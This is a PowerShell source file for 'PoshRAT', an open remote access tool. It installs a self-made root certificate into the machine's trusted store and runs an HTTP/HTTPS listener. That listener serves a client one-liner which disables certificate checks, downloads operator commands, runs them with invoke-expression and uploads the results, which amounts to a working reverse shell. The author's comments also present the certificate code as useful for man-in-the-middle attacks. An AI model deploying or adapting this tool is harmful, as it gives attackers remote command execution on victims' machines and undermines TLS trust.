# This is probably the only file you need/want for Powershell over HTTP(s)

function createCertificate([string] $certSubject, [bool] $isCA)
{
<#
.SYNOPSIS

This function creates two types of certificates using the COM objects accessible in CERTENROLL.LIB
This can be useful for SSL Man in the Middle Attacks, as well as Self-Signed Certificates for encrypted channels.
The purpose of this function is to allowyou to dynamically create certificates, without requiring the tool makecert.exe.

Function: createCertificate
Author: Casey Smith, Twitter: @infosecsmith2
Email: infosecsmith100[at]200gmail.com [remove 100 and 200 to contact me]
License: Whatever...Free do what you want.
Version 1.0.0
Caveat... I suck at writing Powershell. This Function needs to run with local admin privileges to be effective.  It will also install certificates into your Local Machine Certificate Store.

.DESCRIPTION

Dynamically Creates Self-Signed Certificates without the need for makecert.exe All certificates signed by the CA use the CA with the subject "__PoshRAT_Trusted_Root" You can change this if you desire.

.PARAMETER certSubject

Switch: This is the subject of the Certificate.  If you don't understand this, then I can't help you

.PARAMETER isCA

Switch: This tells the function whether or not the certificate is a CA.  True or False

.EXAMPLE
Create a CA certificate with the subject "__PoshRAT_Trusted_Root" 
I use the _ character so that these certificates sort our at the top of the list and are easy to identify.

createCertificate "__PoshRAT_Trusted_Root" $true

.NOTES
Use this script at your own disrection.  
Updated and Current Source Code can be found here
https://github.com/infosecsmith/PoshRAT

#>


$CAsubject = $certSubject
$dn = new-object -com "X509Enrollment.CX500DistinguishedName"
$dn.Encode( "CN=" + $CAsubject, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)


# Create a new Private Key
$key = new-object -com "X509Enrollment.CX509PrivateKey"
$key.ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
# Set CAcert to 1 to be used for Signature
if($isCA)
	{
		$key.KeySpec = 2 
	}
else
	{
		$key.KeySpec = 1
	}
$key.Length = 2048
$key.MachineContext = 1
$key.Create() 
 
# Create Attributes
$serverauthoid = new-object -com "X509Enrollment.CObjectId"
$serverauthoid.InitializeFromValue("1.3.6.1.5.5.7.3.1")
$ekuoids = new-object -com "X509Enrollment.CObjectIds.1"
$ekuoids.add($serverauthoid)
$ekuext = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
$ekuext.InitializeEncode($ekuoids)


$cert = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
$cert.InitializeFromPrivateKey(2, $key, "")
$cert.Subject = $dn
$cert.Issuer = $cert.Subject
$cert.NotBefore = get-date
$cert.NotAfter = $cert.NotBefore.AddDays(90)
$cert.X509Extensions.Add($ekuext)
if ($isCA)
{
	$basicConst = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
	$basicConst.InitializeEncode("true", 1)
	$cert.X509Extensions.Add($basicConst)
}
else
{              
	$signer = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__PoshRAT_Trusted_Root" })
	$signerCertificate =  new-object -com "X509Enrollment.CSignerCertificate"
	$signerCertificate.Initialize(1,0,4, $signer.Thumbprint)
	$cert.SignerCertificate = $signerCertificate
}
$cert.Encode()


$enrollment = new-object -com "X509Enrollment.CX509Enrollment"
$enrollment.InitializeFromRequest($cert)
$certdata = $enrollment.CreateRequest(0)
$enrollment.InstallResponse(2, $certdata, 0, "")


if($isCA)
{              
                                
	# Need a Better way to do this...
	$CACertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__PoshRAT_Trusted_Root" })
	# Install CA Root Certificate
	$StoreScope = "LocalMachine"
	$StoreName = "Root"
	$store = New-Object System.Security.Cryptography.X509Certificates.X509Store $StoreName, $StoreScope
	$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
	$store.Add($CACertificate)
	$store.Close()
                                
}
else
{
	return (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $CAsubject })
} 
     
}


function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   write-host $output
}

<#
	This is the main code section of this script.  It sets up a listener on Port 80 and 443.  
	You can then execute a One-Line script to the "/connect" url of your listenomg Server to allow the Reverse shell to be started.
	Change all references to 127.0.0.1 to the IP address of your Listening Server
	This WILL, install certificates into your Local Machine Store of the server..  
	Also the GUID appid='{e46ad221-627f-4c05-9bb6-2529ae1fa815}' is arbitrary and should be changed.
	The reason for the connect on port 80 is as follows.
	1.  This is fairly ubiquitous and most clients can make this type of external connection
	2.  The code returned, sets up the encrypted channel, and disables the necessity of trusting certificates
	3.  Have fun, this is the most important thing.  If you are not having fun, well, try soemthing different...
	4.  If you don't understand something in this script... Ask, or write a better version 

#>


#Certificate Setup For SSL/TLS
#Create and Install the CACert
$CAcertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__PoshRAT_Trusted_Root"  })
if ($CACertificate -eq $null)
{
createCertificate "__PoshRAT_Trusted_Root" $true

}

$ListenerIP = "127.0.0.1"
$isSSL = $true

$listener = New-Object System.Net.HttpListener

$sslcertfake = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $ListenerIP })
if ($sslcertfake -eq $null)
{
	$sslcertfake =  createCertificate  $ListenerIP $false
}
$sslThumbprint = $sslcertfake.Thumbprint 
$installCert = "netsh http add sslcert ipport=0.0.0.0:443 certhash=$sslThumbprint appid='{e46ad221-627f-4c05-9bb6-2529ae1fa815}'"
iex $installCert
'SSL Certificates Installed...'
$listener.Prefixes.Add('https://+:443/') #HTTPS Listener
$listener.Prefixes.Add('http://+:80/') #HTTP Initial Connect



$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
	#Use this for One-Liner Start
	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
        
        $message = '
					$s = "https://127.0.0.1/rat" 
					$w = New-Object Net.WebClient 
					while($true)
					{
					[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
					$r = $w.DownloadString("$s")
					while($r) {
						$o = invoke-expression $r | out-string 
						$w.UploadString("$s", $o)	
						break
					}
					}
		'

    }		 
	
	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
		Receive-Request($request)	
	}
    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
        $response.ContentType = 'text/plain'
        $message = Read-Host "PS $hostip>"		
    }		
    

    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()
